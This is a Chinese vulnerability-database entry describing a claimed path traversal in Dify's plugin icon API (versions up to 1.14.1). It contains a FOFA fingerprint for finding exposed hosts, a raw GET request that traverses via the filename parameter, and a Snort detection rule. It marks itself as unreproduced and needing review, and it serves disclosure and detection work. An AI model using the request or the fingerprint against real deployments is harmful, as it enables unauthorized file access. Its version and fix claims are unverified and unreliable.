---
schema_version: "1"
id: "VW-20261117-49baa5dab041"
title: "dify-plugin-路径穿越"
product: "Dify"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
identifier_role: ""
version: "dify <= 1.14.1"
prerequisites: "来源未完整说明认证/角色/配置前提；不假定匿名可达；FOFA 指纹已在原文"
side_effects: "unknown；复现前核对写入、凭据、出网与恢复要求"
source: "SourByte05/Vulnerability-Wiki-PoC"
source_status: "archived-verified"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC/blob/main/2026/11/dify-plugin-路径穿越/dify-plugin-路径穿越.md"
---

<!-- vulwiki-editorial:start -->
## 校订与适用边界

### 本次收录记录
- 2026-11-17 周维护收录：来源 SourByte05/Vulnerability-Wiki-PoC；文本全文审阅完成；未执行任何 PoC、依赖安装或目标访问。
- 触发材料（请求/指纹/规则）保留在下方原文中，未做脱敏或删改。
- CVE/产品查重：无重复主入口（本库 master 6314 篇正文级搜索无既有条目）

### 尚未解决的证据缺口
- 影响版本为来源声明，未与厂商公告逐一核对
- 复现截图像素未查看，技术结论以原文文字为准
- 修复状态为来源声明，需按分支核对补丁版本
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

> 以下为来源原文全文（保留原始字节，含广告与联系方式的保留原文）。

# dify-plugin-路径穿越

dify-plugin-路径穿越

# 影响版本

dify <= 1.14.1

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**fofa:**  **icon_hash=&quot;97378986&quot;**

**POC/EXP：**

**step1** 路径穿越

```
GET /console/api/workspaces/current/plugin/icon?tenant_id=00000000-0000-0000-0000-000000000000&filename=../../../health/check HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36


```

​![image](assets/image-20261103223335-ds8ieiy.png)​

**sonrt规则：**

```
alert http any any -> $HOME_NET any (
    msg:"Dify - /console/api/workspaces/current/plugin/icon 路径穿越漏洞 (filename参数)";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri;
        content:"/console/api/workspaces/current/plugin/icon"; fast_pattern;
        content:"filename="; nocase; distance:0;
        content:"../"; nocase; distance:0; within:50;
        content:"health/check"; nocase; distance:0; within:100;
    metadata:
        service http,
        affected_product "Dify",
        vulnerability_type "Path Traversal",
        severity "high";
    classtype:web-application-attack;
    sid:1000798;
    rev:1;
    priority:1;
)
```

# 漏洞修复

#### 官方修复

* **升级至安全版本**：联系官方获取针对该漏洞的安全补丁或升级版本。

‍

---

> 来源：SourByte05/Vulnerability-Wiki-PoC（原文见文首链接，归档 URL 见 frontmatter source_url）